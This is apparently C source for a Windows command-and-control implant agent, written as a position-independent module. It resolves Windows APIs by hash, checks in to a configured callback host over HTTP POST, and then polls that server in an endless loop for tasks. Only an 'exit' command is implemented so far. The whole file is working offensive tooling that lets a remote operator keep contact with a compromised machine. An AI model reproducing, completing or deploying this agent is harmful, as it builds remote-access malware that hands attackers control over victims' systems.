#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"
#include "headers/HTTP.h"

char RAW_PARAMS[1024] __attribute__((section(".text")));

WINBASEAPI HANDLE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(	HANDLE hHandle, DWORD dwMilliseconds);

WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

WINBASEAPI VOID NTAPI NTDLL$ExitProcess(UINT uExitCode);

WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);

FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

FARPROC resolve_unloaded(char * mod, char * func) {
	HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
	if (hModule == NULL) {
		hModule = KERNEL32$LoadLibraryA(mod);
	}
	return KERNEL32$GetProcAddress(hModule, func);
}

void agent_exit(AgentState *state) {
	HttpDestroy(state->http);
	free_params(&state->params);
	NTDLL$ExitProcess(0); // currently only ExitProcess() is supported TODO
}

void perform_checkin(AgentParams *params, HttpHandle *http, CheckinReply *reply) {
	// Generate checkin payload.
	CheckinRequest checkin = { 0 };
	checkin.payload_uuid = clone_str(params->payload_uuid);
	char *msg = generate_checkin_message(&checkin);
	
	// Send checkin payload to C2 server.
	HttpURI uri = {params->callback_host, params->callback_port, params->callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	HttpRequest(http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	// If we get a 200 response code, parse the reply.
	if (response.status_code == 200) {
		parse_checkin_reply(&response, reply);
	}
	
	// Free unneeded allocations.
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
	
}

void perform_tasking(AgentParams *params, HttpHandle *http, TaskingReply *reply) {
	// Generate tasking payload.
	TaskingRequest tasking = { 0 };
	tasking.callback_uuid = clone_str(params->callback_uuid);
	tasking.tasking_size = 1;
	char *msg = generate_tasking_message(&tasking);
	
	// Send tasking payload to C2 server.
	HttpURI uri = {params->callback_host, params->callback_port, params->callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	HttpRequest(http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	// If we get a 200 response code, parse the reply.
	if (response.status_code == 200) {
		parse_tasking_reply(&response, reply);
	}
	
	// Free unneeded allocations.
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
}

void process_task(TaskInfo *task, AgentState *state) {
	if (MSVCRT$strcmp(task->command, "exit") == 0) {
		dprintf("Received exit command.");
		agent_exit(state);
		return;
	}
	
	dprintf("UNKNOWN COMMAND %s: %s %s", task->id, task->command, task->parameters);
}

void go() {
	AgentState state = { 0 };
	
	unpack_params(RAW_PARAMS, &state.params);
	
	state.http = HttpInit(state.params.callback_https);
	
	CheckinReply checkin_reply = { 0 };
	perform_checkin(&state.params, state.http, &checkin_reply);
	
	if ((checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
		dprintf("Checkin failed with: %s", checkin_reply.status);
		free_checkin_reply(&checkin_reply);
		agent_exit(&state);
		return;
	}
	
	state.params.callback_uuid = clone_str(checkin_reply.callback_uuid);
	free_checkin_reply(&checkin_reply);
	dprintf("Successful checkin with payload UUID %s and callback UUID %s", state.params.payload_uuid, state.params.callback_uuid);
	
	while (1) {
		// Look ma, no masking!
		TaskingReply tasking_reply = { 0 };
		perform_tasking(&state.params, state.http, &tasking_reply);
		
		dprintf("Received tasking from C2 server!");
		for (int i = 0; i < tasking_reply.tasking_size; i++) {
			process_task(&tasking_reply.tasks[i], &state);
		}
		
		free_tasking_reply(&tasking_reply);
		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), 5000);
	}
}
